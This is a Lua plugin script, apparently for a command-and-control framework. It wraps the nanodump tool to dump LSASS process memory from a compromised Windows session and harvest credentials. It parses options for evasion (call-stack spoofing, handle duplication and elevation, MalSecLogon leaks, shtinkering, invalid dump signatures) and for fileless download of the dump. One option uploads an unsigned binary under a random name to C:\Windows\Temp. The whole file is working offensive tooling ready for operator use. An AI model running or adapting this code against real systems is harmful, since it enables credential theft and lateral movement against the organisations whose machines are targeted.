local nanodump_dir = "nanodump/dist/"

local function run_nanodump(args)
    local session = active()
    local arch = session.Os.Arch
    -- print(session.Os.Local)
    if arch ~= "x64" then
        error("Nanodump only supports x64")
    end
    -- print(isadmin(session))
    -- print(session.IsPrivilege)
    -- if not isadmin(session) then
    --     error("You need to be admin to run nanodump.")
    -- end
    local bof_file = nanodump_dir .. "nanodump." .. arch .. ".o"
    -- by default, don't use werfault
    local silent_process_exit = ""
    local use_silent_process_exit = 0
    -- by default, don't set any decoy binary
    local seclogon_leak_remote_binary = ""
    -- by default, do not use MalSecLogon leak
    local use_seclogon_leak_local = 0
    local use_seclogon_leak_remote = 0
    -- by default, do not use the MalSecLogon race condition
    local use_seclogon_duplicate = 0
    -- by default, do not get the PID of LSASS
    local get_pid = 0
    -- by default, nanodump will find the PID of LSASS dinamically  
    local pid = 0
    -- by default, nanodump will find the PID of LSASS dinamically 
    local time = timestamp()
    local dump_path = string.format("%s_lsass_%s.dmp", session.Os.Username, time)
    -- by default, download the minidump fileless
    local write_file = 0
    -- by default, do not fork the target process
    local fork = 0
    -- by default, do not snapshot the target process
    local snapshot = 0
    -- by default, do not duplicate an LSASS handle
    local dup = 0
    -- by default, the signature of the minidump is invalid
    local use_valid_sig = 0
    -- by default, do not spoof the stack
    local spoof_callstack = 0
    -- by default, do not use shtinkering
    local use_lsass_shtinkering = 0
    -- by default, dont use handle elevation
    local elevate_handle = 0
    -- by default, dont use handle duplication and elevation
    local duplicate_elevate = 0
    -- by default, the chunk size is 0xe1000
    local chunk_size = 0xe1000

    -- print(#args)
    local i = 1
    while i <= #args do
        if args[i] == "--getpid" then
            get_pid = 1  
        elseif args[i] == "--valid" or args[i] == "-v" then
            use_valid_sig = 1
        elseif args[i] == "--write" or args[i] == "-w" then
            i = i + 1
            if i > #args then
                error("Missing --write value")
            end
            write_file = 1
            dump_path = args[i]
        elseif args[i] == "--pid" or args[i] == "-p" then
            i = i + 1
            if i > #args then
                error("Missing --pid value")
            end
            pid = args[i]
        elseif args[i] == "--fork" or args[i] == "-f" then
            fork = 1
        elseif args[i] == "--snapshot" or args[i] == "-s" then
            snapshot = 1
        elseif args[i] == "--duplicate" or args[i] == "-d" then
            dup = 1
        elseif args[i] == "--elevate-handle" or args[i] == "-eh" then
            elevate_handle = 1
        elseif args[i] == "--duplicate-elevate" or args[i] == "-de" then
            duplicate_elevate = 1   
        elseif args[i] == "--seclogon-leak-local" or args[i] == "-sll" then
            use_seclogon_leak_local = 1
        elseif args[i] == "--seclogon-leak-remote" or args[i] == "-slr" then
            use_seclogon_leak_remote = 1
            i = i + 1
            if i > #args then
                error("Missing --seclogon-leak-remote value")
            end
            seclogon_leak_remote_binary = args[i]
            -- todo: check if the binary exists and is valid
            if not is_full_path(seclogon_leak_remote_binary) then
                error("You must provide a full path: " .. seclogon_leak_remote_binary)
            end
        elseif args[i] == "--silent-process-exit" or args[i] == "-spe" then
            i = i + 1
            if i > #args then
                error("Missing --silent-process-exit value")
            end
            use_silent_process_exit = 1
            silent_process_exit = args[i]
        elseif args[i] == "--shtinkering" or args[i] == "-sk" then
            if not isadmin(session) then
                error("You need to be admin to run the Shtinkering technique")
            end
            use_lsass_shtinkering = 1
        elseif args[i] == "--seclogon-duplicate" or args[i] == "-sd" then
            use_seclogon_duplicate = 1
        elseif args[i] == "--spoof-callstack" or args[i] == "-sc" then
            spoof_callstack = 1
        elseif args[i] == "--chunk-size" or args[i] == "-c" then
            i = i + 1
            if i > #args then
                error("Missing --chunk-size value")
            end
            chunk_size = args[i]
            if tonumber(chunk_size) == nil or chunk_size == 0 then
                error("Invalid chunk size: " .. chunk_size)
            end
            chunk_size = tonumber(chunk_size) * 1024
        elseif args[i] == "--help" or args[i] == "-h" then
            print("help")
            return;
        else
            error("Invalid argument: " .. args[i])
        end
        i = i + 1
    end

    if get_pid==1 and (write_file + use_valid_sig + snapshot + fork + elevate_handle + duplicate_elevate +
        use_seclogon_duplicate + spoof_callstack + use_seclogon_leak_local + 
        use_seclogon_leak_remote + dup + use_silent_process_exit + use_lsass_shtinkering) ~= 0 then
        error("The parameter --getpid is used alone")
    end

    if use_silent_process_exit==1 and (
        write_file + use_valid_sig + snapshot + fork + elevate_handle + duplicate_elevate +
        use_seclogon_duplicate + spoof_callstack + use_seclogon_leak_local + 
        use_seclogon_leak_remote + dup + use_lsass_shtinkering) ~= 0 then
        error("The parameter --silent-process-exit is used alone")
    end

    if fork==1 and snapshot==1 then
        error("The options --fork and --snapshot cannot be used together")
    end

    if dup==1 and elevate_handle==1 then
        error("The options --duplicate and --elevate-handle cannot be used together")
    end

    if duplicate_elevate==1 and spoof_callstack==1 then
        error("The options --duplicate-elevate and --spoof-callstack cannot be used together")
    end

    if dup==1 and spoof_callstack==1 then
        error("The options --duplicate and --spoof-callstack cannot be used together")
    end

    if dup==1 and use_seclogon_duplicate==1 then
        error("The options --duplicate and --seclogon-duplicate cannot be used together")
    end

    if elevate_handle==1 and duplicate_elevate==1 then
        error("The options --elevate-handle and --duplicate-elevate cannot be used together")
    end 

    if duplicate_elevate==1 and dup==1 then
        error("The options --duplicate-elevate and --duplicate cannot be used together")
    end

    if duplicate_elevate==1 and use_seclogon_duplicate==1 then
        error("The options --duplicate-elevate and --seclogon-duplicate cannot be used together")
    end

    if elevate_handle==1 and use_seclogon_duplicate==1 then
        error("The options --elevate-handle and --seclogon-duplicate cannot be used together")
    end 

    if dup==1 and use_seclogon_leak_local==1 then
        error("The options --duplicate and --seclogon-leak-local cannot be used together")
    end
    if dup==1 and use_seclogon_leak_remote==1 then
        error("The options --duplicate and --seclogon-leak-remote cannot be used together")
    end

    if duplicate_elevate==1 and use_seclogon_leak_local==1 then
        error("The options --duplicate-elevate and --seclogon-leak-local cannot be used together")
    end
    if duplicate_elevate==1 and use_seclogon_leak_remote==1 then
        error("The options --duplicate-elevate and --seclogon-leak-remote cannot be used together")
    end

    if elevate_handle==1 and use_seclogon_leak_local==1 then
        error("The options --elevate-handle and --seclogon-leak-local cannot be used together")
    end
    if elevate_handle==1 and use_seclogon_leak_remote==1 then
        error("The options --elevate-handle and --seclogon-leak-remote cannot be used together")
    end

    if use_seclogon_leak_local==1 and use_seclogon_leak_remote==1 then
        error("The options --seclogon-leak-local and --seclogon-leak-remote cannot be used together")
    end
    if use_seclogon_leak_local==1 and use_seclogon_duplicate==1 then
        error("The options --seclogon-leak-local and --seclogon-duplicate cannot be used together")
    end
    if use_seclogon_leak_local==1 and spoof_callstack==1 then
        error("The options --seclogon-leak-local and --spoof-callstack cannot be used together")
    end

    if use_seclogon_leak_remote==1 and use_seclogon_duplicate==1 then
        error("The options --seclogon-leak-remote and --seclogon-duplicate cannot be used together")
    end
    if use_seclogon_leak_remote==1 and spoof_callstack==1 then
        error("The options --seclogon-leak-remote and --spoof-callstack cannot be used together")
    end

    if use_seclogon_duplicate==1 and spoof_callstack==1 then
        error("The options --seclogon-duplicate and --spoof-callstack cannot be used together")
    end
    
    if use_lsass_shtinkering ==0 and use_seclogon_leak_local==1 and write_file==0 then
        error("If --seclogon-leak-local is being used, you need to provide the dump path with --write")
    end

    -- if not use_lsass_shtinkering and use_seclogon_leak_local and not is_full_path(dump_path) then
    if use_lsass_shtinkering==0 and use_seclogon_leak_local==1 and not is_full_path(dump_path) then
        error("If --seclogon-leak-local is being used, you need to provide the dump path with --write")
    end

    if use_lsass_shtinkering==1 and fork==1 then
        error("The options --shtinkering and --fork cannot be used together")
    end

    if use_lsass_shtinkering==1 and snapshot==1 then
        error("The options --shtinkering and --snapshot cannot be used together")
    end

    if use_lsass_shtinkering==1 and use_valid_sig==1 then
        error("The options --shtinkering and --valid cannot be used together")
    end

    if use_lsass_shtinkering==1 and write_file==1 then
        error("The options --shtinkering and --write cannot be used together")
    end

    if use_seclogon_leak_local==1 then
        local folder = "C:\\Windows\\Temp"
        seclogon_leak_remote_binary = folder .. "\\" .. random_string(6) .. ".exe"
        print("[!] An unsigned nanodump binary will be uploaded to: " .. seclogon_leak_remote_binary)
        local nanodump_exe = script_resource( nanodump_dir .. "nanodump." .. arch .. ".exe")
        local exe_content = read(nanodump_exe)
        uploadraw(session, exe_content ,seclogon_leak_remote_binary,"0644",false)
    end
    local packed_args = bof_pack("iziiiiiiiiiiiziiizi", pid, dump_path, write_file, chunk_size, use_valid_sig, fork, snapshot, dup, elevate_handle, duplicate_elevate, get_pid, use_seclogon_leak_local, use_seclogon_leak_remote, seclogon_leak_remote_binary, use_seclogon_duplicate, spoof_callstack, use_silent_process_exit, silent_process_exit, use_lsass_shtinkering)
    return bof(session, script_resource(bof_file), packed_args, true)
end
command("nanodump", run_nanodump, "nanodump <pid> <dump_path> [write_file] [chunk_size]", "")
